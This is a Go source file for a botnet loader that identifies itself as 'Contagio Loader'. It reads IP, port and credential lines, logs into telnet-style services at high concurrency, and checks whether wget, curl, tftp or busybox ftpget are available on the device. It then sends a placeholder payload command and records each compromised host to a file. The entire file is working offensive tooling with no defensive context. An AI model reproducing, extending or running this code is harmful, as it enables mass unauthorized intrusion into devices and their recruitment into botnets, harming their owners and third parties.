package main

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const Payload = "YOUR PAYLOAD (make payload)"

var (
	Delay          int = 25 // ms
	ConnectTimeout int = 5  // s
	MaxThreads     int = 2000

	SaveResults bool   = true // connected
	Filename    string = "res.txt"

	CheckAuthPrompt bool = true
	CheckCommands   bool = true
)

var (
	Processed int64
	Logins    int64
	Ran       int64

	Errors  int64
	Threads int
	wg      sync.WaitGroup
)

func main() {
	defer catch()

	reader := bufio.NewReader(os.Stdin)
	scanner := bufio.NewScanner(reader)

	wg.Add(1)
	go status()
	for scanner.Scan() {
		defer catch()

		if runtime.NumGoroutine() >= MaxThreads {
			time.Sleep(20 * time.Second)
		}
		atomic.AddInt64(&Processed, 1)
		_str := scanner.Text()
		str := strings.Split(_str, " ")
		if len(str) != 2 {
			continue
		}

		splitted := strings.Split(str[0], ":")
		if len(splitted) != 2 {
			continue
		}

		port, err := strconv.Atoi(splitted[1])
		ip := net.ParseIP(splitted[0])
		if err != nil {
			continue
		}

		splitted = strings.Split(str[1], ":")
		go load(ip.To4(), port, splitted[0]+"\r\n", splitted[1]+"\r\n", scanner.Text())
		time.Sleep(time.Duration(Delay) * time.Millisecond)
	}
	wg.Wait()

}

func load(ip net.IP, port int, login string, password string, fullstring string) {

	defer catch()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return
	}
	defer syscall.Close(fd)

	addr := syscall.SockaddrInet4{
		Port: port,
		Addr: [4]byte(ip),
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(ConnectTimeout)*time.Second)
	defer cancel()

	connected := make(chan bool)

	go func() {

		defer catch()

		err := syscall.Connect(fd, &addr)
		if err != nil {
			atomic.AddInt64(&Errors, 1)
			return
		}

		connected <- true

	}()

	select {
	case <-ctx.Done():
		atomic.AddInt64(&Errors, 1)
		return
	case <-connected:
		close(connected)
		break
	}

	syscall.SetNonblock(fd, true)

	time.Sleep(3 * time.Second)

	if CheckAuthPrompt {
		if strings.Contains(strings.ToLower(string(read(fd))), "login") {
			err := send(fd, login, &addr)
			if err != nil {
				return
			}
		}

		time.Sleep(1 * time.Second)

		if strings.Contains(strings.ToLower(string(read(fd))), "password") {
			err := send(fd, password, &addr)
			if err != nil {
				return
			}
		}

	} else {
		err := send(fd, login, &addr)
		if err != nil {
			return
		}

		time.Sleep(1 * time.Second)

		err = send(fd, password, &addr)
		if err != nil {
			return
		}
	}

	atomic.AddInt64(&Logins, 1)

	if CheckCommands {
		status, err := HasNotFoundError(fd, &addr)
		if err != nil {
			return
		}
		if status {
			return
		}
	}
	err = send(fd, Payload+"\r\n", &addr)
	if err != nil {
		return
	}

	atomic.AddInt64(&Ran, 1)

	file, err := os.OpenFile(Filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	file.Write([]byte(fullstring + "\n"))

}

func send(fd int, p string, sa syscall.Sockaddr) error {
	defer catch()

	err := syscall.Sendto(fd, []byte(p), syscall.MSG_NOSIGNAL, sa)
	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return err
	}

	return nil

}

func read(fd int) []byte {
	defer catch()

	buf := make([]byte, 4<<10)

	n, _, err := syscall.Recvfrom(fd, buf, 0)
	if err != nil {
		atomic.AddInt64(&Errors, 1)
		return nil
	}

	return buf[:n]

}

func HasNotFoundError(fd int, sa syscall.Sockaddr) (bool, error) {
	defer catch()

	commands := []string{
		"wget",
		"curl",
		"tftp",
		"ftpget",
		"busybox ftpget",
		"cd",
		"cat --help",
	}
	var totalerrs int

	for _, i := range commands {
		err := send(fd, i+"\r\n", sa)
		if err != nil {
			return false, err
		}

		time.Sleep(1 * time.Second)

		buf := read(fd)
		if strings.Contains(strings.ToLower(string(buf)), "not found") {
			totalerrs++
		}
	}

	if len(commands)-totalerrs < 2 {
		return true, nil
	}

	return false, nil
}

func status() {
	for {
		fmt.Printf("[Contagio  Loader] Processed: %d   Logins: %d   Ran: %d   Errors: %d   Threads: %d\n", Processed, Logins, Ran, Errors, runtime.NumGoroutine())
		time.Sleep(1 * time.Second)
	}

}

func catch() {
	if er := recover(); er != nil {
		fmt.Print(er)
		return
	}

}
